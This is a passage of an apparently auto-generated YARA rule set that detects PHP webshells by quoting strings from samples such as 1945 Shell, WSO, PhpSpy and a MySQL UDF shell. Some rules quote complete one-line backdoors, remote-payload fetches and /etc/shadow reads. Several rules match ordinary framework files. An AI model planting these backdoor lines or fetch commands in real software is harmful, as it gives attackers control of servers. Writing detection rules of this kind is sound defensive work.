      $x2 = "$display_src  = \"https://raw.githubusercontent.com/alintamvanz/1945shell/master/september-login.html\"; // source display hidde" ascii
      $x3 = "$display_src  = \"https://raw.githubusercontent.com/alintamvanz/1945shell/master/september-login.html\"; // source display hidde" ascii
      $x4 = "$source=$act->getcontent(\"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/cgi_telnet.pl\");$act->simpantext($" ascii
      $x5 = "ubusercontent.com/rintoar/shell_backdoor/master/nonamesource.txt\");if(is_writable(getcwd())){if(!file_exists('1945_kcy')){$aler" ascii
      $x6 = "error_log(0);ob_start();error_reporting(0);set_time_limit(0);@ini_set('error_log',NULL);@ini_set('log_errors',0);@ini_set('max_e" ascii
      $x7 = ",\"value=\\\"Execute query\\\"\").\"<br />\";$cn=mysqli_connect($hostname,$username,$password,$database) or die(mysqli_error());" ascii
      $x8 = "tml->actfail();}}}elseif($__action__==\"rsw\"){if(Act45::getscript(\"awesome1945.php\",\"https://raw.githubusercontent.com/alint" ascii
      $x9 = "yana.php\",\"kuchiyose_lc\"=>\"https://raw.githubusercontent.com/alintamvanz/webshell/master/linuxcode.php\",\"kuchiyose_wa\"=>" ascii
      $x10 = "hubusercontent.com/alintamvanz/webshell/master/ext/c99.php\",\"kuchiyose_ms\"=>\"https://raw.githubusercontent.com/alintamvanz/w" ascii
      $s11 = "17 Shell</h1><p>Scandir() function not exist in this server, You Can use command \\\"shell.php?cmd=ls -lia\\\" for execute shell" ascii
      $s12 = "$loguri_1945  = \"?login=1945\"; // login url , default : shell.php?login=1945" fullword ascii
      $s13 = "w.githubusercontent.com/alintamvanz/1945shell/master/update.1945\");@eval($getu);if($update==\"YES\"){$result_upt=\"<b><i> UPDAT" ascii
      $s14 = "//-------------------------------- 1945 Shell - 1945v2017 ---------------------------------" fullword ascii
      $s15 = "<!-- indonesianpeople.shutdown57@gmail.com | indonesianpeople@yandex.com -->" fullword ascii
      $s16 = "['to'];if($_POST['method']=='serv'){FileMan45::cmd(\"ln -s $target $link\");if(file_exists($link)){$html->show(\"Symlink done :*" ascii
      $s17 = "\"title=\\\"Create Symbolic link\\\"\").\" ]\");$tools.=$html->li(\"[ \".$html->a($ak.\"jpgshell\",\"*.Jpg Shell (.htacess)\",\"" ascii
      $s18 = "_exec($ch);curl_close($ch);} public function reverse($url){$ch=curl_init(\"http://domains.yougetsignal.com/domains.php\");curl_s" ascii
      $s19 = "pt.=\"<li> Email    : \".$email.\"</li></pre>\";$getshell=file_get_contents(\"https://raw.githubusercontent.com/alintamvanz/1945" ascii
      $s20 = "@ Find Our Project In Github : https://github.com/alintamvanz/1945shell" fullword ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 300KB and
      1 of ($x*) and all of them
}

rule AffectedTest
{
   meta:
      description = "php17 - file AffectedTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "98c3c9fb03dcc06f40dfc4067bd62a9b8e07313c3719b78044b9830a0a4a5d67"
   strings:
      $s1 = "'lithium\\console\\command\\g11n\\Extract' => \"{$ns}\\console\\command\\g11n\\ExtractTest\"" fullword ascii
      $s2 = "* Copyright 2016, Union of RAD. All rights reserved. This source" fullword ascii
      $s3 = "* The full license text can be found in the LICENSE.txt file." fullword ascii
      $s4 = "* code is distributed under the terms of the BSD 3-Clause License." fullword ascii
      $s5 = "$group->add('lithium\\tests\\cases\\analysis\\LoggerTest');" fullword ascii
      $s6 = "'lithium\\g11n\\Message' => \"{$ns}\\g11n\\MessageTest\"," fullword ascii
      $s7 = ": the most RAD framework for PHP (http://li3.me)" fullword ascii
      $s8 = "'lithium\\tests\\cases\\analysis\\LoggerTest'," fullword ascii
      $s9 = "'lithium\\tests\\cases\\console\\command\\g11n\\ExtractTest'" fullword ascii
      $s10 = "$tests = Affected::apply($this->report, $group->tests());" fullword ascii
      $s11 = "$results = Affected::analyze($this->report);" fullword ascii
      $s12 = "$group->add('lithium\\tests\\cases\\g11n\\CatalogTest');" fullword ascii
      $s13 = "$group->add('lithium\\tests\\cases\\g11n\\MessageTest');" fullword ascii
      $s14 = "$result = $tests->map('get_class', ['collect' => false]);" fullword ascii
      $s15 = "'lithium\\tests\\cases\\g11n\\CatalogTest'," fullword ascii
      $s16 = "'lithium\\tests\\cases\\g11n\\MessageTest'," fullword ascii
      $s17 = "public function testSingleTestWithSingleResult() {" fullword ascii
      $s18 = "use lithium\\test\\Report;" fullword ascii
      $s19 = "$this->report = new Report();" fullword ascii
      $s20 = "$this->report->group = $group;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule sig_060ad92489947d410d897474079c1477
{
   meta:
      description = "php17 - file 060ad92489947d410d897474079c1477.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "70d1d6937c7b00d4909ff80dcadc7771349d918f99e3515038d550a3d8ac90f2"
   strings:
      $x1 = ". '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><br" fullword ascii
      $x2 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\";" fullword ascii
      $x3 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x4 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(\\'Php\\',null" fullword ascii
      $x5 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true;" fullword ascii
      $x6 = ". '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><br>' . " ascii
      $s7 = "$explink = 'http://exploit-db.com/search/?action=search&filter_description=';" fullword ascii
      $s8 = "echo '<br/><span>posix_getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit=\\'g(null,null,\"5\",this.param1.v" fullword ascii
      $s9 = "wsoSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s10 = "t.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>\";" fullword ascii
      $s11 = "if( wsoBruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s12 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $s13 = "setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);" fullword ascii
      $s14 = "wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?\"yes <a href='#' onclick='g(\\\"FilesTools\\\", \\\"/etc/\\" fullword ascii
      $s15 = "lse{g(null,null,this.cmd.value,this.show_errors.checked?1:\\'\\');} return false;\"><select name=alias>';" fullword ascii
      $s16 = "if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))" fullword ascii
      $s17 = "function wsoBruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s18 = "$out = wsoEx(\"perl /tmp/bc.pl \".$_POST['p2'].\" \".$_POST['p3'].\" 1>/dev/null 2>&1 &\");" fullword ascii
      $s19 = "TP_HOST'] . \" - WSO \" . WSO_VERSION .\"</title>" fullword ascii
      $s20 = "wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?\"yes <a href='#' onclick='g(\\\"FilesTools\\\", \\\"/etc/\\" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_4abe7634820f3bf12d961cba7e2a3671ed3dfddf
{
   meta:
      description = "php17 - file 4abe7634820f3bf12d961cba7e2a3671ed3dfddf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b7909ffe6a4479750b77b969bfe516841436aba67115d4b137b372619993f027"
   strings:
      $x1 = "<b><font color=#830000>3.</font></b><font color=#830000> <b><font color=#830000>User</b></font> - '.( get_current_user()).' " fullword ascii
      $x2 = "$res .= '<form action=\"'.$xshell.'?act=execute\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"execute\">" fullword ascii
      $x3 = "<b><font color=#83000>Execute system commands!</font></b>" fullword ascii
      $x4 = "<b><font color=#830000>7. Your IP - </font></b><font color=#830000>'.(getenv('REMOTE_ADDR')).'</font><br><br>" fullword ascii
      $s5 = "<b><font color=#830000>4. Server Software - </font></b><font color=#830000>'.(getenv('SERVER_SOFTWARE')).'</font><br><br>" fullword ascii
      $s6 = "<tr><td align=center><b><font color=#83000>Copyright </font><a href=\"http://ak74-team.net\" target=\"_blank\">AK-74 Security Te" ascii
      $s7 = "$res .= '<tr><td align=center><b><font color=#83000>Copyright </font><a href=\"http://ak74-team.net\" target=\"_blank\">AK-74 Se" ascii
      $s8 = "<b><font color=#830000>5. Request Method - </font></b><font color=#830000>'.(getenv('REQUEST_METHOD')).'</font><br><br>" fullword ascii
      $s9 = "if (!move_uploaded_file($_FILES['filename']['tmp_name'],$_SESSION['currentdir'].'/'.$_POST['filename2']))" fullword ascii
      $s10 = "<b><font color=#830000>6. Server IP - </font></b><font color=#830000>'.(getenv('SERVER_ADDR')).'</font><br><br>" fullword ascii
      $s11 = "$content .= $shell->downloadfile($_GET['file']);" fullword ascii
      $s12 = "$res .= '<form action=\"'.$xshell.'?act=filemanager\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"chmod\">'" fullword ascii
      $s13 = "$res .= '<form action=\"'.$xshell.'?act=exesys\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"exesys\">" fullword ascii
      $s14 = "<a href=\"'.$xshell.'?act=phpinfo\" target=\"_blank\">phpinfo()</a>" fullword ascii
      $s15 = "if (!copy($_FILES['filename']['tmp_name'],$_SESSION['currentdir'].'/'.$_POST['filename2']))" fullword ascii
      $s16 = "ty Team<a> <font color=#83000>2005 - '.date(\"Y\").'</font></b></td></tr>';" fullword ascii
      $s17 = "$content .= $shell->editfileform($_GET['file']);" fullword ascii
      $s18 = "$res .= '<html><head><title>AK-74 Security Team Web Shell</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=" ascii
      $s19 = "$res .= '<html><head><title>AK-74 Security Team Web Shell</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=" ascii
      $s20 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'.(getenv('HTTP_X_FORWARDED_FOR')).'</font><br><br" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule sig_7a088b0114a6147072c70403f5b3c47fe0145984
{
   meta:
      description = "php17 - file 7a088b0114a6147072c70403f5b3c47fe0145984.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6b84760d22eabc648f8ecd31f6ef51c4b679e1e9329bcaade78878ca8a884c32"
   strings:
      $x1 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";" fullword ascii
      $x2 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";" fullword ascii
      $x3 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");" fullword ascii
      $x4 = "$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);" fullword ascii
      $x5 = "$process = proc_open(\"\".$_POST['cmd'].\"\", $descriptorspec, $pipes);" fullword ascii
      $s6 = "$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'" fullword ascii
      $s7 = "</a> | <a href=\"?dir=C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\">pcAnywhere</a> ');" fullword ascii
      $s8 = "header(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"_Files.tar.gz\");" fullword ascii
      $s9 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword ascii
      $s10 = "$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \" | <a href=\\\"?action=phpinfo\\\" target=\\\"_blank\\\">PHPINFO()</a>\" : \"\";" fullword ascii
      $s11 = ": '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));" fullword ascii
      $s12 = "$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die(\"PHP Create COM WSHSHELL failed\");" fullword ascii
      $s13 = "$cmd = \"cmd.exe\";" fullword ascii
      $s14 = "echo ($proxycontents) ? $proxycontents : \"<body bgcolor=\\\"#F5F5F5\\\" style=\\\"font-size: 12px;\\\"><center><br><p><b>" fullword ascii
      $s15 = "$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'" fullword ascii
      $s16 = "</a>'.$reg.$phpinfo.' | <a href=\"?action=shell\">WebShell</a> | <a href=\"?action=logout\">" fullword ascii
      $s17 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"POST\\\">\\n\";" fullword ascii
      $s18 = "ru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','proc_open'=>'proc_open');" fullword ascii
      $s19 = "<title>http://<? echo $_SERVER['HTTP_HOST'];?>  PhpSpy 2006 " fullword ascii
      $s20 = "$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule activeLink_mysqlDAL_class
{
   meta:
      description = "php17 - file activeLink_mysqlDAL.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d727377615d468db61ad636c0ea5b0378320e8aa06d69ca264e7e45218a82729"
   strings:
      $s1 = "$all=$this->mysqlHelper->getRecords('select linkGUID,nextIP,createTime from activeLink ORDER BY createTime DESC ');" fullword ascii
      $s2 = "$all = $this->mysqlHelper->getRecords('select linkGUID,nextIP,createTime from activeLink ORDER BY createTime DESC li" fullword ascii
      $s3 = "$all=$this->mysqlHelper->getRecords('select linkGUID,nextIP,createTime from activeLink '.$buildStr.' ORDER BY create" fullword ascii
      $s4 = "$all = $this->mysqlHelper->getRecords('select linkGUID,nextIP,createTime from activeLink ' . $buildStr . ' ORDER BY " fullword ascii
      $s5 = "$this->mysqlHelper->update(\"update activeLink set nextIP='\".$model->nextIP.\"' where GUID='\".$model->linkGUID.\"'\");" fullword ascii
      $s6 = "$rowsCount=$this->mysqlHelper->getRows('select COUNT(*) from activeLink '.$buildStr);" fullword ascii
      $s7 = "$this->mysqlHelper->insert(\"insert into activeLink (linkGUID,nextIP,createTime) VALUES ('\".$model->linkGUID.\"','\".$model" fullword ascii
      $s8 = "$rowsCount=$this->mysqlHelper->getRows('select COUNT(*) from activeLink');" fullword ascii
      $s9 = "function  GetPageList(activeLinkModel $model, $start, $limit)" fullword ascii
      $s10 = "function  GetPageCount(activeLinkModel $model, $perPageCount)" fullword ascii
      $s11 = "function  GetModel(activeLinkModel $model)" fullword ascii
      $s12 = "function  GetList(activeLinkModel $model)" fullword ascii
      $s13 = "// TODO: Implement GetPageCount() method." fullword ascii
      $s14 = "// TODO: Implement GetPageList() method." fullword ascii
      $s15 = "if(empty($model->linkGUID)&&empty($model->nextIP)&&empty($model->createTime)){" fullword ascii
      $s16 = "// TODO: Implement GetList() method." fullword ascii
      $s17 = "// TODO: Implement GetModel() method." fullword ascii
      $s18 = "$rs=$this->GetList($model);" fullword ascii
      $s19 = "$this->mysqlHelper->delete(\"delete from activeLink \".$buildStr);" fullword ascii
      $s20 = "foreach($rowValue as $key=>$value){" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_715f17e286416724e90113feab914c707a26d456
{
   meta:
      description = "php17 - file 715f17e286416724e90113feab914c707a26d456.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3a63bbe7a6d83f5d7d0c3523ebe340f4ef0f9147bdff9a75ab7f3b24983cd6c2"
   strings:
      $x1 = "passthru( $bindir.\"mysqldump --user=$USERNAME --password=$PASSWORD " fullword ascii
      $s2 = "href='$PHP_SELF?action=utils&command=show_processlist'>Processlist</a>\\n\";" fullword ascii
      $s3 = "* Homepage : http://popeye.snu.ac.kr/~smkim/mysql" fullword ascii
      $s4 = "* Developed By SooMin Kim (smkim@popeye.snu.ac.kr)" fullword ascii
      $s5 = "$mysqlHandle = mysql_pconnect( $HOSTNAME, $USERNAME, $PASSWORD );" fullword ascii
      $s6 = "href='$PHP_SELF?action=utils&command=flush_hosts'>Hosts</a>\\n\";" fullword ascii
      $s7 = "href='$PHP_SELF?action=utils&command=flush_logs'>Logs</a>\\n\";" fullword ascii
      $s8 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>\\n\";" fullword ascii
      $s9 = "header(\"Content-disposition: filename=$filename.sql\");" fullword ascii
      $s10 = "href='$PHP_SELF?action=utils&command=flush_privileges'>Privileges</a>\\n\";" fullword ascii
      $s11 = "echo \"<a href='http://popeye.snu.ac.kr/~smkim/mysql'>Hompage<a> is " fullword ascii
      $s12 = "href='$PHP_SELF?action=dumpDB&dbname=$dbname'>Dump</a></td>\\n\";" fullword ascii
      $s13 = "echo \"<a href='mailto:smkim76@icqmail.com'>SooMin Kim</a><br>\\n\";" fullword ascii
      $s14 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword ascii
      $s15 = "if( $command == \"flush_logs\" ) {" fullword ascii
      $s16 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword ascii
      $s17 = "if( $command == \"flush_hosts\" ) {" fullword ascii
      $s18 = "href='$PHP_SELF?action=utils&command=show_variables'>Variables</a>\\n\";" fullword ascii
      $s19 = "global $PHP_SELF, $USERNAME, $PASSWORD, $action, $dbname, $tablename;" fullword ascii
      $s20 = "if( $command == \"\" || substr( $command, 0, 5 ) == \"flush\" ) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}


rule php17_ajax
{
   meta:
      description = "php17 - file ajax.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c39e61ac718fbe32f43d14ebbea23f63de0ebd93480a68362e23e879f2a1de4c"
   strings:
      $s1 = "* When a field settings metabox is expanded, return a JSON element containing the field settings HTML" fullword ascii
      $s2 = "* It assumes the CSV file is properly formatted, and doesn't check for errors" fullword ascii
      $s3 = "* Covert a multi-line CSV string into a 2d array. Follows RFC 4180, allows" fullword ascii
      $s4 = "* Function that outputs a list of terms so that the user can exclude terms from a list selector." fullword ascii
      $s5 = "// Dump our current form transient." fullword ascii
      $s6 = "* \"cells with \"\"escaped delimiters\"\"\" && multi-line enclosed cells" fullword ascii
      $s7 = "$wpdb->query($wpdb->prepare(\"DELETE FROM \".NINJA_FORMS_FAV_FIELDS_TABLE_NAME.\" WHERE id = %d\", $fav_id));" fullword ascii
      $s8 = "$wpdb->query($wpdb->prepare(\"DELETE FROM \".NINJA_FORMS_FAV_FIELDS_TABLE_NAME.\" WHERE id = %d\", $def_id));" fullword ascii
      $s9 = "$wpdb->query($wpdb->prepare(\"DELETE FROM \".NINJA_FORMS_FIELDS_TABLE_NAME.\" WHERE id = %d\", $field_id));" fullword ascii
      $s10 = "$wpdb->query($wpdb->prepare(\"DELETE FROM \".NINJA_FORMS_SUBS_TABLE_NAME.\" WHERE id = %d\", $sub_id));" fullword ascii
      $s11 = "# match anything thats not a comma or linebreak zero to infinity" fullword ascii
      $s12 = "# times (possesive), then match either a comma or a linebreak or" fullword ascii
      $s13 = "$count = count($key) - 1;" fullword ascii
      $s14 = "if ( isset ( $_POST['from_ajax'] ) && absint( $_POST['from_ajax'] ) == 1 ) {" fullword ascii
      $s15 = "$data = isset ( $_REQUEST['data'] ) ? json_decode( stripslashes( $_REQUEST['data'] ), true ) : array();" fullword ascii
      $s16 = "add_action( 'wp_ajax_ninja_forms_import_list_options', 'ninja_forms_import_list_options' );" fullword ascii
      $s17 = "$terms = get_terms( $tax_name, array( 'hide_empty' => false ) );" fullword ascii
      $s18 = "$field_order = json_decode( strip_tags( stripslashes( $_REQUEST['field_order'] ) ), true );" fullword ascii
      $s19 = "* @param string $e The enclosing character" fullword ascii
      $s20 = "* @param string $d The delimiter between values" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule sig_4475d48b0a2931bf2ef9590ce74953bb9abcc535
{
   meta:
      description = "php17 - file 4475d48b0a2931bf2ef9590ce74953bb9abcc535.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "49daa239b4cde3834e3e8fa507589a64f8899e98e5a2eaa129febe3f789250e1"
   strings:
      $x1 = "$query=\"INSERT into Temp_udf values (CONVERT($shellcode,CHAR));\";" fullword ascii
      $s2 = "<a href=\"http://www.moonsec.com\" target=\"_blank\">" fullword ascii
      $s3 = "004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29" ascii
      $s4 = "Blog:<a href=\"http://www.moonsec.com\" target=\"_blank\">www.moonsec.com</a> Bbs:<a href=\"http://www.moonsafe.com\" target=\"_" ascii
      $s5 = "4E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29" ascii
      $s6 = "Blog:<a href=\"http://www.moonsec.com\" target=\"_blank\">www.moonsec.com</a> Bbs:<a href=\"http://www.moonsafe.com\" target=\"_" ascii
      $s7 = "$s=\"SELECT unhex(cmd) FROM diy_dll INTO DUMPFILE '$diypath'\";" fullword ascii
      $s8 = "45787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D65746572" ascii
      $s9 = "5F5F636C65616E5F747970655F696E666F5F6E616D65735F696E7465726E616C" ascii
      $s10 = "$query=\"SELECT udf FROM Temp_udf INTO DUMPFILE '\".$path.\"';\" ;" fullword ascii
      $s11 = "457870656374656420737472696E67207479706520666F72206E616D6520706172616D65746572" ascii
      $s12 = "echo '<option value=\"create function sys_eval returns string soname \\'moonudf.dll\\'\">" fullword ascii
      $s13 = "45787065637465642065786163746C792074776F20617267756D656E7473" ascii
      $s14 = "6C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33" ascii
      $s15 = "006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33" ascii
      $s16 = "6C69625F6D7973716C7564665F7379732E646C6C" ascii
      $s17 = "5F5F435F73706563696669635F68616E646C6572" ascii
      $s18 = "6C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974" ascii
      $s19 = "7273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D65746572000000000000457870" ascii
      $s20 = "65637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_22fe41b696bdb1628a9fc6b92bda5e2fc68d7e28
{
   meta:
      description = "php17 - file 22fe41b696bdb1628a9fc6b92bda5e2fc68d7e28.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f5623fd8e347c8ba22d88ebb73dff55d2799629163603af98e22c22f4b78023c"
   strings:
      $s1 = "<center><a href=\"shell.php\">Shell</a> | <a href=\"sudoShell.php\">sudo Shell</a> | <a href=\"index.php\">Home</a></center>" fullword ascii
      $s2 = "<textarea name=\"savedfile\" height=\"600px\" width=\"700px\" rows=\"35\" cols=\"100\"><?php  echo $filecontent ?></textarea>" fullword ascii
      $s3 = "header( 'Location: login.html' );" fullword ascii
      $s4 = "$filecontent = file_get_contents( $filepath );" fullword ascii
      $s5 = "<form action=\"editor.php\" method=\"post\">" fullword ascii
      $s6 = "<input type=\"text\" name=\"filepath\" size=\"99px\" value=\"<?php  echo $filepath ?>\">" fullword ascii
      $s7 = "$savedfile = $_POST['savedfile'];" fullword ascii
      $s8 = "<span>File path: </span><input type=\"text\" size=\"100px\" name=\"filepath\">" fullword ascii
      $s9 = "$filepath = $_POST['filepath'];" fullword ascii
      $s10 = "if ( !isset( $_SESSION['username'] ) ) {" fullword ascii
      $s11 = "<input type=\"submit\" value=\"Edit file\">" fullword ascii
      $s12 = "<input type=\"submit\" value=\"Save file\">" fullword ascii
      $s13 = "<title>Rasputin File Editor</title>" fullword ascii
      $s14 = "$file = fopen( $filepath, 'w' );" fullword ascii
      $s15 = "if ( isset( $savedfile ) == true ) {" fullword ascii
      $s16 = "if ( isset( $filepath ) == true ) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_78d1d7721a2da01bf431144258b2bb9e5a6db8a2
{
   meta:
      description = "php17 - file 78d1d7721a2da01bf431144258b2bb9e5a6db8a2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d77b86ff6cc7b8ce45577a4a59872f7c9caf17e8b7137d6f3df6d892dcd402d5"
   strings:
      $s1 = "$remote_file = 'http://test.com/test.txt';" fullword ascii
      $s2 = "while($code = file_get_contents($remote_file)){" fullword ascii
      $s3 = "unlink($_SERVER['SCRIPT_FILENAME']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AdminArticleValidate
{
   meta:
      description = "php17 - file AdminArticleValidate.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9717272187959e585257c98930732c124809b1c065b3aa16ea827961bf74bbf3"
   strings:
      $s1 = "// | Copyright (c) 2013-2018 http://www.thinkcmf.com All rights reserved." fullword ascii
      $s2 = "//        'add'  => ['user_login,user_pass,user_email']," fullword ascii
      $s3 = "// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )" fullword ascii
      $s4 = "< 449134904@qq.com>" fullword ascii
      $s5 = "//        'edit' => ['user_login,user_email']," fullword ascii
      $s6 = "// +----------------------------------------------------------------------" fullword ascii
      $s7 = "'post_title.require' => '" fullword ascii
      $s8 = "'post_title' => 'require'," fullword ascii
      $s9 = "namespace app\\portal\\validate;" fullword ascii
      $s10 = "// | Author: " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule a006bd315921224f84596f5a04a62c9eb0504e8b
{
   meta:
      description = "php17 - file a006bd315921224f84596f5a04a62c9eb0504e8b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ab9b9f215af89a1a546e1472899de18a15cb115f03d7c58d0b5ef78a1917f7f1"
   strings:
      $s1 = "echo copy(\"http://www.r57.me/c99.txt\",\"lostwolf.php\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule aae1adca6d4439b07b507ad91d55b738fd7a2553
{
   meta:
      description = "php17 - file aae1adca6d4439b07b507ad91d55b738fd7a2553.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3b4fee3c2e375fb89546c07df17f30a0da3d793f91096884621adbce69592b5e"
   strings:
      $s1 = "<?php$_POST['sa']($_POST['sb'],$_POST['sc'])?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule array_intersect_uassoc_filename_last_char_must_be_r
{
   meta:
      description = "php17 - file array_intersect_uassoc-filename-last-char-must-be-r.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "afbdc53c91694f7a70bb97eff6a5080b1b47484bc4cc52e779ca08dca64c63df"
   strings:
      $s1 = "array_intersect_uassoc (array($_REQUEST[$password] => \"\"), array(1), $f);" fullword ascii
      $s2 = "$password = \"LandGrey\";" fullword ascii
      $s3 = "${\"LandGrey\"} =  $key.\"Land!\";" fullword ascii
      $s4 = "$key = substr(__FILE__,-5,-4);" fullword ascii
      $s5 = "$f = pack(\"H*\", \"13\".\"3f120b1655\") ^ $LandGrey;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule a34bf456d61fb7b44dc923b6789e7688eda337f2
{
   meta:
      description = "php17 - file a34bf456d61fb7b44dc923b6789e7688eda337f2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6609675e2d47e9ccdfa8f15e32b34db1978556445d764635f137f2404037104a"
   strings:
      $s1 = "mb_ereg_replace('.*', $_REQUEST['op'], '', 'e');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AdminUserExampleFactory
{
   meta:
      description = "php17 - file AdminUserExampleFactory.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e5b9ca0839951e8ebc39aa974696c40a370ef3805cd3aa27bd5326e3f216dc58"
   strings:
      $s1 = "* @var \\Faker\\Generator" fullword ascii
      $s2 = "* @param FactoryInterface $userFactory" fullword ascii
      $s3 = "$user->setPlainPassword($options['password']);" fullword ascii
      $s4 = "->setDefault('password', 'password123')" fullword ascii
      $s5 = "use Sylius\\Component\\Core\\Model\\AdminUserInterface;" fullword ascii
      $s6 = "return $this->faker->firstName . ' ' . $this->faker->lastName;" fullword ascii
      $s7 = "protected function configureOptions(OptionsResolver $resolver): void" fullword ascii
      $s8 = "public function __construct(FactoryInterface $userFactory, string $localeCode)" fullword ascii
      $s9 = "/** @var AdminUserInterface $user */" fullword ascii
      $s10 = "$this->faker = \\Faker\\Factory::create();" fullword ascii
      $s11 = "* @param string $localeCode" fullword ascii
      $s12 = "public function create(array $options = []): AdminUserInterface" fullword ascii
      $s13 = "class AdminUserExampleFactory extends AbstractExampleFactory implements ExampleFactoryInterface" fullword ascii
      $s14 = "use Symfony\\Component\\OptionsResolver\\OptionsResolver;" fullword ascii
      $s15 = "use Sylius\\Component\\Resource\\Factory\\FactoryInterface;" fullword ascii
